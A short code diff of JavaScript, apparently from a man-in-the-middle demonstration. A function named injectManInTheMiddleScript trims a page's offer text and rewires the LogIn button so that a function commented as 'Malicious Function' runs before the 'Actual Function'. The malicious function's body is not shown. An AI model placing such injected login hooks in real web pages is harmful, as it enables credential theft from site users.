@@ -5,7 +5,9 @@ function injectManInTheMiddleScript() {
     var textHtml = document.getElementById("demo").innerHTML 
     document.getElementById("demo").innerHTML = textHtml.substring(0,textHtml.indexOf('you have Big Bonanza Offer'));
     document.getElementById("LogIn").onclick = function() {
+        // Malicious Function
         listingFunction();
+        // Actual Function
         myFunction();
     }
 }
